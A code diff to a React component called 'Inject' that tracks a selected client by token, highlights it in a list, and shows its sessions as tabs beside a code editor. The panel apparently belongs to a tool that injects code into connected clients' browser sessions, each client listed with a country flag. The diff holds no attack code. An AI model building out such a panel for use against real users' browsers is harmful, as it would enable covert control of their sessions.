@@ -1585,7 +1585,10 @@ class Inject extends Component {
     let { socket } = this.props
 
     this.setState({
-      selectedClient: this.state.clients[token]
+      selectedClient: {
+        token: token,
+        client: this.state.clients[token]
+      }
     })
   }
 
@@ -1615,7 +1618,12 @@ class Inject extends Component {
             {this.state.clients && Object.keys(this.state.clients).map((token, i) => {
               const client = this.state.clients[token]
               return (
-                <ListItem key={i} button dense onClick={() => this.switchClient(token)}>
+                <ListItem
+                  key={i}
+                  button
+                  dense
+                  onClick={() => this.switchClient(token)}
+                  className={this.state.selectedClient.token === token ? 'active' : ''}>
                   <ListItemIcon>
                     <img src={client.images.country} />
                   </ListItemIcon>
@@ -1629,8 +1637,8 @@ class Inject extends Component {
           </List>
         </div>
         <div className="inject-editor-container">
-          {this.state.selectedClient && this.state.selectedClient.sessions &&
-            <ChromeTabs tabs={this.state.selectedClient.sessions}>
+          {this.state.selectedClient && this.state.selectedClient.client && this.state.selectedClient.client.sessions &&
+            <ChromeTabs tabs={this.state.selectedClient.client.sessions}>
             </ChromeTabs>
           }
           <MonacoEditor
